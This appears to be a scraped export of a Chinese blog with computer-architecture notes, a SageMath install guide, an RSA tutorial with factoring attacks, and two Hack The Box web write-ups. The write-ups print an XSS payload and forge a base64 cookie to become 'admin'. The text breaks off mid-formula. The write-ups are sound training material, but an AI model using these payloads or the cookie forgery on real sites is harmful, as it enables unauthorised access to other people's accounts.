假设一开始a，y都是0。只要a抱持0，y自然也会保持0。但如果a变成了1的话，y也会跟着变成1，并且之后不管发生什么了都会一直是1。 也就是说它实现了一个最简易的存储功能。（只要a在任何时间点变成了1，那么y就会一直记得这件事情。） 当然，想要实现更完善的存储功能，我们还得加上复原的选项。 RS-Latch / RS-FlipFlopS (Set)，R (Reset)。 真值表： \\begin{array}{cc|cc|c} S & R & Q(t) & \\neg Q(t) & \\text{Behavior}\\\\ \\hline 0 & 0 & Q(t) & \\neg Q(t) & \\text{Speicher}\\\\ 1 & 0 & 1 & 0 & \\text{Set}\\\\ 0 & 1 & 0 & 1 & \\text{Reset}\\\\ 1 & 1 & 0 & 0 \\\\ \\end{array}我们关心的是在某个输入固定时最终会落到的稳定态，所以计算顺序本身不是逻辑因果。以S=1，R=0的情况为例：我们可以先计算出$\\neg Q(t)$一定等于0，然后再用这个结果去计算得到$Q(t)$等于1。这个时候可以把Q等于1再带进去检查$\\neg Q(t)$是否等于0。 相当于我们是在找一组方程式的解。 D-Latch / D-FlipFlop我们想要一个更加方便的结构： 一个负责传输数据（q） 一个负责控制这个数据是否会被写入 D(Data)，E (Enable)。 （设上面 and 的结果为S，下面 and 的结果为R，跟RS-Latch的位置一样。） 真值表： \\begin{array}{cc|cc|cc} D & E & Q(t) & \\neg Q(t) & R & S\\\\ \\hline 0 & 0 & Q(t) & \\neg Q(t) & 0 & 0\\\\ 1 & 0 & Q(t) & \\neg Q(t) & 0 & 0\\\\ 0 & 1 & 0 & 1 & 1 & 0\\\\ 1 & 1 & 1 & 0 & 0 & 1\\\\ \\end{array}也就是说： 当E为0时，不发生任何改变/存储 当E为1时，会存储D当前的值/内容 E=1的时候D和Q的值是一模一样的。E=0的时候就直接把Q当前的延长出去到下一个E=1就好。 Taktflankengesteuerte D-Flipflops 假设原来CLK=0。 1. CLK 刚从 0 跳到 1（上升沿瞬间）：E 变为 1（打开 D-Latch）。 直接路径：CLK 立刻 = 1 延迟路径：CLK_delayed 还没来得及变成 1，仍≈0 所以 $\\neg CLK_{delayed}\\approx 1$ 于是： E = 1 \\land 1 = 12. 过了延迟 Δt 后：E 关掉，D-Latch 再次锁住。 延迟链输出终于变成 1： CLK_delayed = 1 $\\neg CLK_{delayed}=0$ 于是： E = 1 \\land 0 = 03. CLK 从 1 掉到 0（下降沿）：下降沿不会产生脉冲。 直接 CLK=0，则无论另一边是什么： E=0所以就是只在CLK上升后的一小段实际内会存储D的内容。 Clk = 0 时： 左边 E=/Clk=1 → 左边（master）透明，N 跟随 D_in 右边 E=Clk=0 → 右边（slave）锁住，Q_out 保持不变 Clk = 1 时： 左边 E=/Clk=0 → 左边锁住，N 固定 右边 E=Clk=1 → 右边透明，Q_out 跟随 N（但 N 这时是固定的） 和之前类似的画图策略： 先画N，因为有negation的存在，所以CLK=0时，N的部分和D的部分一模一样。 再画Q。CLK=1时，Q和D一模一样。 2*2 Bit Speicher write位等于0代表读，等于1代表写； 灰色的是选择器； 上面的2个黄色部分是A (Adresse)=0的结果，下面的是A (Adresse)=1的。 Inkrementer自增器主要用于比如说更新程序计数器（Program counter），需要到达的效果类似： 1add pc, pc, 4 需要2个步骤，计算加法并且存储结果。所以对应的逻辑电路为： RISC-V Single-Cycle Prozessor部件先解释一下所有需要的部件： Program Counter (PC)： Instruktionsspeicher：存储所有需要执行的指令 A：Addresse RD（Read Data）：读取的指令 Registerbank： 会处理所有的寄存器。其中 A1，A2是操作里的寄存器的地址。 RD1和RD2是这两个寄存器里的具体内容。 A3和WD3是第3个寄存器（存储计算结果的）。 只有当WE3=1（Write Enable）的时候才会写入第三个寄存器。 Arithmetic Logic Unit (ALU)： 详细版： ALU会进行所有的逻辑运算。ALUControl这个参数会指定执行具体哪项操作（如ADD, AND, SUB 等，以3 bit的格式）。注意，最后一个bit的内容（即 $\\text{ALUControl}_0$）会传递给上面的Sum以及Sum上面的那个MUX（选择器）。 比如： 000表示加法； 001表示减法 010表示AND； 011表示OR； 101表示进行是否等于0的判断。 Datenspeicher： CLK表示系统内的计时器。 A 是需要读取/写入的地址。 RD是读取到的信息（Read Data）。 WD是需要写入的信息（Write Data）。 只有当WE=1（Write Enable）的时候才会写入。 RISC-V 架构完整的RISC-V Single-Cycle Prozessor的结构： 在一个时钟周期内，信号从头到尾在整个硬件电路里跑完完整的一轮。 解释一下这些信号： PCSrc：决定当前地址，是继续下去还是回到返回地址。 0表示回到之前的地址继续 1表示在现在的地址基础上继续。 ResultSrc：决定当前输出。 如果是lw之类的操作，需要设为01，因为需要将读取到的信息存入结果寄存器（RD -&gt; WD3）。 如果是R-Type之类的操作，则需要设为00。 MemWrite：决定当前是否要写入到Memory中。 0表示不写入； 1表示写入。 ALUControl：决定当前的ALU操作 add, and, sub 之类的R-Type操作直接设为操作本身就好（以3 bit的格式）； lw, sw需要设为add，因为需要通过加法计算地址； beq等需要设为sub，因为这里判断a和b是否相等是通过直接传递a-b的计算结果实现的。 ALUSrc：决定当前是使用的第二个寄存器还是立即数（imm）。 0表示使用第二个寄存器的内容； 1表示使用imm。 ImmSrc：决定当前读取imm的格式，因为每种Type的指令存储imm的格式都不一样。 RegWrite：决定当前结果是否需要写入第3个寄存器。 0表示不写入； 1表示写入。 ControlUnit的部分构造稍微再具体一点是这样的： 一些常见操作的参数例子： x表示不重要。比如说在 jal 那里，jump 的参数会被设为1，这个1会和 (zero AND Branch) 进行 or 操作，所以结果一定是1，也就意味着 Branch的结果在这个情况下无关紧要。 RISC-V Multicycle Prozessor在Singlecycle里，takt的时间需要考虑最复杂的指令执行所需要的时间，比如说load之类的操作比其他的操作要久很多，所以整体看下来很亏，因为需要将就这种操作。 在多周期 RISC-V 架构中，一条指令的执行被拆分为多个时钟周期，每个周期完成一个特定的阶段（Stage），并通过CLK控制周期。takt的时间只需要设置成这些步骤中最长的时间即可。 通常分为以下 5 个阶段： 1. Fetch（取指 + 设置 PC） 动作：根据 PC 寄存器中的地址，从内存（Instr/Data Memory）中读取指令代码，并将其存入指令寄存器（Instr）中。 同时进行：利用 ALU 计算 PC + 4，并将新地址写回 PC 寄存器，为取下一条指令做准备。 2. Decode（译码） 动作：控制单元（Control Unit）解析指令寄存器（Instr）里的位（如 op, funct3 等），确定指令类型。 数据准备：从寄存器堆（Register File）中读出源操作数 rs1 和 rs2 的值，分别存入中间寄存器 A 和 B 中；同时 Extend 部件生成扩展后的立即数 ImmExt。 3. Execute（执行） 动作：ALU 根据控制信号执行具体的计算任务。 算术指令（如 addi）：计算 A + ImmExt。 访存指令（如 lw/sw）：计算内存基地址加偏移量 A + ImmExt，结果存入 ALUOut。 分支指令（如 beq）：计算跳转目标地址并比较寄存器值。 4. Memory（访存） 注意：只有Load和Store指令需要这个阶段。 动作： lw (Load)：使用 ALU 计算出的地址从内存中读取数据，存入 Data 寄存器。 sw (Store)：将寄存器 B 中的值写入 ALU 计算出的内存地址中。 算术指令（如 addi）通常跳过此阶段或在此阶段不执行有效操作。 5. Writeback（写回） 动作：将最终结果写回到寄存器堆的 rd 寄存器中。 对于算术指令：写回的是 ALUOut 里的运算结果。 对于Load 指令：写回的是从内存读出的 Data。 部件 与之前不同，这里把Intruktionsspeicher和Datenspeicher合并了。 并且这里PC多加了一个EN信号，起到控制的作用。 架构 可以把里面带有EN信号的部件理解成一个寄存器。 1. 存储与指令流控制（Memory &amp; Instruction） 这组信号负责协调内存访问以及指令的锁存。 PCWrite：PC 寄存器的写使能信号。当该信号有效时，PC 会在时钟上升沿更新为 PCNext 的值。 AdrSrc：地址来源选择信号。控制内存地址输入端的二选一选择器（Mux）。 0 代表选择 PC 地址（取指阶段）； 1 代表选择 Result 总线上的地址（访存阶段）。 MemWrite：内存的写使能信号。 1 时执行写内存操作（如 sw 指令）； 0 时执行读操作或不操作。 IRWrite：指令寄存器（Instr）的写使能信号。仅在取指周期有效，用于将从内存读出的指令编码锁存在寄存器中，供后续多个周期使用。 2. 寄存器堆与立即数控制（Register &amp; Immediate） 这组信号控制数据的流向以及立即数的处理方式。 RegWrite：寄存器堆（Register File）的写使能信号。当需要将结果写回 rd 寄存器时（如 addi、lw 的写回阶段），该信号置为 1。 ImmSrc：立即数格式控制信号。由控制单元根据指令的 op 编码生成，告知 Extend 部件按哪种格式（I-type, S-type, B-type 等）提取并扩展指令中的立即数。 3. ALU 输入选择与运算控制（ALU Control） 这组信号决定了 ALU 执行的具体逻辑任务。 ALUSrcA：ALU 第一个操作数的选择信号。 00：选择 PC。 01：选择 OldPC。 10：选择从寄存器读取的 RD1（存储在 A 寄存器中）。 ALUSrcB：ALU 第二个操作数的选择信号。 00：选择从寄存器读取的 RD2（存储在 B 寄存器中）。 01：选择常量 4。 10：选择扩展后的立即数 ImmExt。 ALUControl：运算类型控制信号。直接控制 ALU 执行加、减、与、或等特定的算术或逻辑运算。 4. 结果写回与跳转控制（Result &amp; Program Flow） 这组信号负责将处理完的数据导向正确的目的地。 ResultSrc：结果总线选择信号。控制三选一选择器，决定 Result 总线的数据来源： 00：来自 ALUOut（存储上一个周期计算结果的寄存器）。 01：来自 Data（存储从内存读出数据的寄存器）。 10：来自当前周期的 ALUResult 直接输出。 PCSrc：PC 来源选择信号。决定下一个周期的 PC 值。 0：通常指向 ALUResult（计算出的 PC+4）。 1：通常指向 ALUOut（计算出的跳转目标地址）。 Control Unit更细节的构造： ALU Decoder： Instruction Decoder： 阶段 更详细的阶段： Decode: MemAdr: MemRead: MemWB: S-Typ： R-Typ： B-Typ： I-Typ： JAL： 完整的时序流程图","categories":[{"name":"TUM info 课程笔记","slug":"TUM-info-课程笔记","permalink":"https://archer-baiyi.github.io/en/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"ERA 计算机体系结构","slug":"TUM-info-课程笔记/ERA-计算机体系结构","permalink":"https://archer-baiyi.github.io/en/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/ERA-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"}],"tags":[{"name":"Rechnerarchitektur","slug":"Rechnerarchitektur","permalink":"https://archer-baiyi.github.io/en/tags/Rechnerarchitektur/"},{"name":"计算机体系结构","slug":"计算机体系结构","permalink":"https://archer-baiyi.github.io/en/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"},{"name":"逻辑电路图","slug":"逻辑电路图","permalink":"https://archer-baiyi.github.io/en/tags/%E9%80%BB%E8%BE%91%E7%94%B5%E8%B7%AF%E5%9B%BE/"},{"name":"逻辑门","slug":"逻辑门","permalink":"https://archer-baiyi.github.io/en/tags/%E9%80%BB%E8%BE%91%E9%97%A8/"}]},{"title":"如何在Kali Linux里安装sage","slug":"CTF/Crypto/如何在Linux_wsl里安装sage","date":"2025-03-31T12:44:34.000Z","updated":"2025-11-27T20:23:40.791Z","comments":true,"path":"2025/03/31/CTF/Crypto/如何在Linux_wsl里安装sage/","permalink":"https://archer-baiyi.github.io/en/2025/03/31/CTF/Crypto/%E5%A6%82%E4%BD%95%E5%9C%A8Linux_wsl%E9%87%8C%E5%AE%89%E8%A3%85sage/","excerpt":"","text":"这里主要介绍2种方法。第一种方法安装的sage的版本会相对旧一些，但是整体的安装流程非常快速。而第二种方法安装的是最新版的sage，功能会相对多很多（尤其是某些Lattice相关的功能），只不过整体流程会很长。 使用Miniforge安装sage注意，这个方法安装的sage的版本会相对旧一些，但是整体的安装流程非常快速，一般10分钟内就可以完成。 一共分成2个步骤： 安装Miniforge（Anaconda的轻量化替代品） 使用conda安装sage 下载vscode的wsl版（可选） 安装Miniforge1wget https://github.com/conda-forge/miniforge/releases/latest/download/Miniforge3-Linux-x86_64.sh 然后安装脚本： 1bash Miniforge3-Linux-x86_64.sh 如果安装时询问你是否要把它加入 .bashrc ， 选择是，这样一来每次打开wsl它都会自动启动并进入base环境，会比较方便。 当然如果这个自启没有设置成功，也可以手动设置： 先打开.bashrc 编辑器 1nano ~/.bashrc 在文件末尾添加： 12. &quot;$HOME/miniforge3/etc/profile.d/conda.sh&quot;conda activate base 然后使用Ctrl + o和Ctrl + x保存并退出。 最后再运行： 1source ~/.bashrc 安装sage通过 1conda create -n sage sage -c conda-forge 安装sage。然后每次使用 1conda activate sage 激活sage环境并用 1sage 打开sage。 下载vscode的wsl版由于单纯用命令行运行sage代码不太方便，并且只用sage的话有些python的命令（比如说连接服务器等）容易出问题，可以安装一个vscode的wsl版。 首先在Windows里的vscode下载wsl的插件 之后在当前wsl的命令行里输入： 12code .# 用vscode打开当前文件夹 它便会开始自动下载wsl版的vscode。 下载完成后，每次启动wsl之后只需要先打开vscode： 1code . 然后在vscode的命令行里输入： 1conda activate sage 便可以编写并运行import了sage库的python代码。 记住要先开vscode再开启sage的环境，不然先开启了sage环境后，进到vscode里会掉回base的环境！ 下载sage源码并编译这种方法安装的是最新版的sage，功能会相对多很多（尤其是某些Lattice相关的功能），只不过整体流程会很长，可能会持续一个小时。（主要是编译那步需要等很久。） 稍微解释一下，在sage的官网：https://www.sagemath.org/download-linux.html 可以看到： Sage官方不再提供编译好的二进制文件了，所以我们才需要自己在本地编译。 准备系统环境使用 1sudo nano /etc/apt/sources.list 打开sources.list文件并添加以下内容（或替换）： 1deb http://http.kali.org/kali kali-rolling main contrib non-free non-free-firmware 保存并退出（Ctrl+O，回车，Ctrl+X），然后执行更新： 1sudo apt update &amp;&amp; sudo apt upgrade 安装构建依赖Sage 依赖大量开发工具，先装些最基本的： 1sudo apt install build-essential m4 perl git curl python3 gfortran libbz2-dev libssl-dev libffi-dev libsqlite3-dev libreadline-dev automake cmake 也可能会用到： 123sudo apt install pkg-config texinfo libmpfr-dev libgmp-dev libmpc-dev \\zlib1g-dev libncurses-dev libgdbm-dev libpng-dev libcurl4-openssl-dev \\libglpk-dev texlive texlive-latex-extra 建议存储够的话全都下了。 下载 Sage 源码12git clone https://github.com/sagemath/sage.gitcd sage 配置项目1./configure 检测你的系统工具和库，并准备 Makefile。如果缺少依赖，它会告诉你缺了什么。 编译 Sage1make -j$(nproc) 有些时候编译时会报cmake 编译失败的错误，这时可以先跳过编译 cmake 的步骤，直接用系统自带的版本来代替 Sage 自己编译的版本： 设置 Sage 使用系统的 cmake： 1export SAGE_INSTALL_USE_SYSTEM_CMAKE=yes 然后重新开始编译： 1make -j$(nproc) 启动 Sage1./sage 出现类似如下输出则表示成功： 1SageMath version 10.7.beta7, Release Date: 2025-06-29 加入全局环境变量（可选）你可以把 ./sage 添加到 PATH，方便全局使用。 首先编辑 .bashrc： 1nano ~/.bashrc 在这份文件的最下方添加： 1export PATH=&quot;$HOME/ctf-kali/sage:$PATH&quot; 然后刷新配置： 1source ~/.bashrc 验证： 1which sage 应该输出类似： 1/home/archer/sage/sage 安装Python库SageMath内部绑定了一个独立的 Python 环境，可以用这个命令来将库安装到 Sage 的内部环境中： 123456sage -pip install 库名sage -pip install pandassage -pip install -r requirements.txt 或者是 1sage -python -m pip install 库名","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"Crypto","slug":"CTF/Crypto","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Crypto/"}],"tags":[{"name":"sage","slug":"sage","permalink":"https://archer-baiyi.github.io/en/tags/sage/"},{"name":"wsl","slug":"wsl","permalink":"https://archer-baiyi.github.io/en/tags/wsl/"},{"name":"vscode","slug":"vscode","permalink":"https://archer-baiyi.github.io/en/tags/vscode/"},{"name":"kali","slug":"kali","permalink":"https://archer-baiyi.github.io/en/tags/kali/"},{"name":"Miniforge","slug":"Miniforge","permalink":"https://archer-baiyi.github.io/en/tags/Miniforge/"}]},{"title":"HTB Full Stack Conf Writeup","slug":"CTF/Web/HTB-Full-Stack-Conf-Writeup","date":"2025-03-30T10:40:40.000Z","updated":"2025-04-02T21:31:39.305Z","comments":true,"path":"2025/03/30/CTF/Web/HTB-Full-Stack-Conf-Writeup/","permalink":"https://archer-baiyi.github.io/en/2025/03/30/CTF/Web/HTB-Full-Stack-Conf-Writeup/","excerpt":"","text":"题目描述 （无附件） 观察打开网页： 渗透因为提示用alert，并且题目描述里提到了JavaScript，所以直接尝试最简单的JavaScript注入： 1&lt;script&gt;alert(&#x27;1&#x27;);&lt;/script&gt; 得到flag：HTB{p0p..p0p..p0p...alert(1337)} 。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Web/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/en/tags/Writeup/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/en/tags/HTB/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/en/tags/Web/"},{"name":"Injection","slug":"Injection","permalink":"https://archer-baiyi.github.io/en/tags/Injection/"},{"name":"JavaScript","slug":"JavaScript","permalink":"https://archer-baiyi.github.io/en/tags/JavaScript/"},{"name":"注入","slug":"注入","permalink":"https://archer-baiyi.github.io/en/tags/%E6%B3%A8%E5%85%A5/"}]},{"title":"HTB baby auth Writeup","slug":"CTF/Web/HTB-baby-auth-Writeup","date":"2025-03-30T10:24:26.000Z","updated":"2025-04-02T21:31:50.592Z","comments":true,"path":"2025/03/30/CTF/Web/HTB-baby-auth-Writeup/","permalink":"https://archer-baiyi.github.io/en/2025/03/30/CTF/Web/HTB-baby-auth-Writeup/","excerpt":"","text":"题目描述 （无附件） 观察打开网站： 注册个账号然后登录试试： 查看当前cookie： 这段内容base64解码可以得到： 123eyJ1c2VybmFtZSI6IjEyMyJ9&#123;&quot;username&quot;:&quot;123&quot;&#125; 渗透将cookie改成 1&#123;&quot;username&quot;:&quot;admin&quot;&#125; 的base64，即 1eyJ1c2VybmFtZSI6ImFkbWluIn0= 修改cookie然后刷新网页： 得到flag：HTB{s3ss10n_1nt3grity_1s_0v3r4tt3d_4nyw4ys} 。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Web/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/en/tags/Writeup/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/en/tags/HTB/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/en/tags/Web/"},{"name":"Cookie","slug":"Cookie","permalink":"https://archer-baiyi.github.io/en/tags/Cookie/"}]},{"title":"RSA加解密，漏洞以及攻击方法","slug":"CTF/Crypto/RSA加解密以及攻击方法","date":"2025-03-29T19:01:56.000Z","updated":"2026-01-14T10:39:38.920Z","comments":true,"path":"2025/03/29/CTF/Crypto/RSA加解密以及攻击方法/","permalink":"https://archer-baiyi.github.io/en/2025/03/29/CTF/Crypto/RSA%E5%8A%A0%E8%A7%A3%E5%AF%86%E4%BB%A5%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/","excerpt":"","text":"RSA加/解密首先设 \\varphi(m) := | \\{ 1 \\leq k \\leq m ｜\\gcd(k, m) = 1 \\} |为欧拉函数（Euler’sche Phi-function）。 RSA加密算法的初始化流程如下： 选择2个很大的质数$p, q$. 计算$n:=pq$。这里的n是公开的，$p, q$则是保密的。 计算$\\varphi(n)$。（因为我们知道$n=pq$，且$p, q$均为质数，我们可以利用公式$\\varphi(n)=(p-1)(q-1)$进行快速计算。） 选择$e \\in \\{1,2,…,\\varphi(n)-1\\}$，使得$gcd(\\varphi(n),e)=1$. 我们的公钥为$(e,n)$。 计算密钥$d$，满足$ed \\equiv 1$ mod $\\varphi(n)$. 用扩展欧几里得算法找到 $x$ 和 $y$，使得： e \\cdot x + \\varphi(n) \\cdot y = 1, 上式中，$x$ 模 $\\varphi(n)$ 的值即为 $d$： d \\equiv x \\bmod \\varphi(n).如果 $d &lt; 0$，需要将其调整到正数范围： d = d + \\varphi(n). 公钥：$n, e$ 私钥：$d$ 假设明文内容为$m$，密文为$c$，加密： c=m^e \\text{ mod } n, \\ \\ \\ \\ a,b \\in \\mathbb{Z}_n.解密： m=c^d \\text{ mod } n.如此一来，任何人都可以将一段信息加密后发送给我们，而只有我们能够解密这段信息。 注意：在RSA加解密中我们默认明文$m$是一个小于$n$的数。 而我们这样计算出来的密钥d之所以可以成功解密信息是基于以下理论： 欧拉定理（Euler Theorem）：设 $n$ 是一个正整数，$a$ 是一个与 $n$ 互素的整数（即 $(a, n) = 1$），$\\varphi$ 是欧拉函数。那么 a^{\\varphi(n)} \\equiv 1 \\ \\ \\ \\text{mod} \\ n.完整加解密代码示例： 12345678910111213141516171819202122232425262728293031323334353637383940414243from Crypto.Util.number import getPrime, bytes_to_long, long_to_bytes # 将string转换成大整数from math import gcddef modinv(e, phi): # 扩展欧几里得算法计算模逆 def extended_gcd(a, b): if b == 0: return (1, 0) else: x1, y1 = extended_gcd(b, a % b) x, y = y1, x1 - (a // b) * y1 return (x, y) x, _ = extended_gcd(e, phi) return x % phip = getPrime(512) # 512位的素数q = getPrime(512) # 512位的素数n = p * qphi = (p - 1) * (q - 1)e = 65537 # 大部分默认使用这个e的值assert gcd(e, phi) == 1d = modinv(e, phi)# 加密def encrypt(message, e, n): m = bytes_to_long(message.encode()) c = pow(m, e, n) return c# 解密def decrypt(cipher_int, d, n): m = pow(cipher_int, d, n) message = long_to_bytes(m).decode() return messagemsg = &quot;Hello World!&quot;cipher = encrypt(msg, e, n)decrypted = decrypt(cipher, d, n) RSA-CRT由于实际应用中，我们会有意挑选很大的p,q，所以会导致解密时pow(c, d, N)的计算成本会很高（即便是有快速幂的情况下）。所以我们就会想到先计算在mod p,q下的结果，然后再拼起来，以此来提高效率。 注意，CRT的加速只针对解密的过程。原因有2点： 大部分情况下e都是较小的数，比如说65537，计算成本不会很高。但是与之相对的d就会很大。 这个加速需要用到密钥的信息，所以加密方也没法用。 先来回顾一下简易版的中国剩余定理（Chinese Remainder Theorem）： 当我们有同余等式： \\begin{cases} x \\equiv a \\pmod{p} \\\\ x \\equiv b \\pmod{q} \\end{cases}且p,q互质时，则在$\\mathbb{Z}_n$（$n:=pq$）下存在唯一的解。 所以我们可以在正常RSA的基础上先计算3个CRT密钥参数： \\begin{align*} d_p &= d \\pmod{p-1}\\\\ d_q &= d \\pmod{q-1}\\\\ q_{\\text{inv}} &= q^{-1} \\pmod{p}\\\\ \\end{align*}然后在解密时，先计算： \\begin{align*} m_p &= c^{d_p} \\pmod{p}\\\\ m_q &= c^{d_q} \\pmod{q}\\\\ \\end{align*}最后再利用CRT来计算出明文 m \\equiv c^d \\ \\text{mod } n完整加解密代码示例： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647from Crypto.Util.number import getPrime, bytes_to_long, long_to_bytesfrom math import gcdp = getPrime(512)q = getPrime(512)n = p * qphi = (p - 1) * (q - 1)e = 65537assert gcd(e, phi) == 1d = pow(e, -1, phi)# CRT 相关参数dp = d % (p - 1) # d_p = d mod (p-1)dq = d % (q - 1) # d_q = d mod (q-1)q_inv = pow(q, -1, p) # q^&#123;-1&#125; mod p# 加密：def encrypt(message, e, n): m = bytes_to_long(message.encode()) c = pow(m, e, n) return c# 使用 CRT 的解密：def decrypt(cipher_int, p, q, dp, dq, q_inv): # 1. 分别在模 p, q 上解密 m1 = pow(cipher_int, dp, p) # c^dp mod p m2 = pow(cipher_int, dq, q) # c^dq mod q # 2. 用 Garner 公式做 CRT 合并 # h = (m1 - m2) * q_inv (mod p) h = (m1 - m2) * q_inv % p # m = m2 + h * q (mod n) m = (m2 + h * q) % n message = long_to_bytes(m).decode() return messagemsg = &quot;Hello World!&quot;cipher = encrypt(msg, e, n)decrypted = decrypt(cipher, p, q, dp, dq, q_inv)print(&quot;cipher =&quot;, cipher)print(&quot;decrypted =&quot;, decrypted) 也可以直接用SymPy里现成的函数crt： 1234567891011121314from sympy.ntheory.modular import crtdef decrypt(cipher_int, p, q, dp, dq): # 分别在模 p、q 上解密 m1 = pow(cipher_int, dp, p) m2 = pow(cipher_int, dq, q) # 用 SymPy 的 crt 合并： # crt([p, q], [m1, m2]) 返回 (x, 模数) m, mod = crt([p, q], [m1, m2]) m = int(m) # SymPy 的整型转成 Python int message = long_to_bytes(m).decode() return message PEM 格式（Privacy Enhanced Mail）RSA 的密钥（无论是私钥还是公钥）在保存或传输时，通常会被先序列化成二进制格式（如 DER），然后再用 Base64 编码，再加上头尾标记（如 ——-BEGIN PUBLIC KEY——-），形成一种叫 PEM 的文本格式。 我们有2种比较好用的方法来生成/解析PEM内容： Python使用 cryptography 库： 生成生成私钥： 123456789101112131415161718192021222324252627282930313233343536373839from cryptography.hazmat.primitives.asymmetric import rsafrom cryptography.hazmat.primitives import serializationfrom Crypto.Util.number import getPrimee = 65537p = getPrime(512) # 512位的素数q = getPrime(512) # 512位的素数n = p * qphi = (p - 1) * (q - 1)d = pow(e, -1, phi)# 计算 CRT 参数# 这些参数必须传（库要求的）dmp1 = d % (p - 1)dmq1 = d % (q - 1)iqmp = pow(q, -1, p)# 构造私钥对象private_numbers = rsa.RSAPrivateNumbers( p=p, q=q, d=d, dmp1=dmp1, dmq1=dmq1, iqmp=iqmp, public_numbers=rsa.RSAPublicNumbers(e=e, n=n))private_key = private_numbers.private_key()# 导出为 PEM 格式（PKCS#8）pem = private_key.private_bytes( encoding=serialization.Encoding.PEM, format=serialization.PrivateFormat.PKCS8, encryption_algorithm=serialization.NoEncryption())# 打印 PEM 私钥print(pem.decode()) 然后可以从里面提取公钥： 123456public_key = private_key.public_key()pem_pub = public_key.public_bytes( encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo)print(pem_pub.decode()) 解析解析私钥： 123456789101112131415161718192021222324from cryptography.hazmat.primitives import serializationpem_data = b&quot;&quot;&quot;-----BEGIN PRIVATE KEY-----......-----END PRIVATE KEY-----&quot;&quot;&quot;# 解析 PEM 私钥对象private_key = serialization.load_pem_private_key( pem_data, password=None # 如果加密了，需要提供密码（bytes）)# 提取私钥参数（适用于 RSA 密钥）numbers = private_key.private_numbers()# 打印出 RSA 私钥参数print(f&quot;Modulus (n): &#123;numbers.public_numbers.n&#125;&quot;)print(f&quot;Public Exponent (e): &#123;numbers.public_numbers.e&#125;&quot;)print(f&quot;Private Exponent (d): &#123;numbers.d&#125;&quot;)print(f&quot;Prime 1 (p): &#123;numbers.p&#125;&quot;)print(f&quot;Prime 2 (q): &#123;numbers.q&#125;&quot;)print(f&quot;d mod (p-1): &#123;numbers.dmp1&#125;&quot;)print(f&quot;d mod (q-1): &#123;numbers.dmq1&#125;&quot;)print(f&quot;q^-1 mod p: &#123;numbers.iqmp&#125;&quot;) # 用于CRT的 解析公钥： 123456789101112from cryptography.hazmat.primitives import serializationpem_data = b&quot;&quot;&quot;-----BEGIN PUBLIC KEY-----......-----END PUBLIC KEY-----&quot;&quot;&quot;key = serialization.load_pem_public_key(pem_data)# 提取公钥的详细信息numbers = key.public_numbers()print(f&quot;Modulus (n): &#123;numbers.n&#125;&quot;)print(f&quot;Exponent (e): &#123;numbers.e&#125;&quot;) 攻击质因数分解nFermat’s Factorization这种方法适用于p和q的大小差不多的情况。 算法原理：我们先来看一个引理：引理 1 如果 $n$是一个奇正整数，那么将$n$分解为两个正整数的乘积，与将其表示为两个平方数之差之间存在一一对应关系。 证明： 设n是一个奇正整数，且$ n = ab$，其中$a$和$b$是两个正的奇整数。那么$n$可以表示为两个平方数之差： n = ab = s^2 - r^2,其中，$r = \\frac{a - b}{2}$，$s = \\frac{a + b}{2}$。反过来，如果$n$是两个平方数之差，即$n = s^2 - r^2$，那么我们可以将其因式分解为： n = (s - r)(s + r).也就算说：对于任意的奇正整数$n$，只要我们可以找到2个数$s,r$，使得他们的平方差等于$n$，那么我们就可以得到$n$的两个因数。$\\square$ 因此我们可以考虑以下算法： 首先计算 $t := \\lceil \\sqrt{n} \\rceil$ 依次测试 $t^2-n, (t+1)^2-n,… $ 是否为平方数 如果是（即$r^2 = s^2-n$ ），则得到$n = (s-r)(s+r)$。 如果不是，则这个方法行不通。 注意，这个算法一定会终止，因为测试到$s = \\frac{n+1}{2}$时： n = (\\frac{n+1}{2})^2 - (\\frac{n-1}{2})^2会得到$n = n\\cdot 1$（没有什么意义），但是在实际情况里我们不一定会让它跑完，因为太慢了。 代码实现： 1234567891011121314151617181920import mathdef fermat_factor(n, max_iter=1000000): a = math.isqrt(n) if a * a &lt; n: a += 1 for _ in range(max_iter): b2 = a*a - n b = math.isqrt(b2) if b*b == b2: return a - b, a + b a += 1 return Nonen = result = fermat_factor(n)if result: print(&quot;p =&quot;, result[0], &quot;q =&quot;, result[1])else: print(&quot;未成功&quot;) Pollard’s p-1适用于$n$有一个smooth factor $p$（即所有满足$q | (p-1)$的素数$q$都很小）的情况。 算法原理： 首先来回顾以下费马小定理： 费马小定理（Fermat’s Little Theorem）：设 $p$ 是一个素数，$a$ 是一个整数，且 $a$ 与 $p$ 互素（即 $(a, p) = 1$）。那么有： a^{p - 1} \\equiv 1 \\pmod{p} 我们现在假设$p$是$n$的一个素因数。如果我们能找到一个整数$k$使得$(p-1)|k!$，即存在一个$l$使得$(p-1)l=k!$，那么就有： 2^{k!} = 2^{(p-1)l} = (2^{p-1})^l \\equiv 1^l \\equiv 1 \\ \\ \\ \\text{ mod }p这意味着 $p|(2^{k!}-1)$，也就是说$p$是$2^{k!}-1$和$n$的一个共同的因数。 所以算法如下： 对于$k=1,2,3,…$我们计算 r_k := (2^{k!} \\ \\ 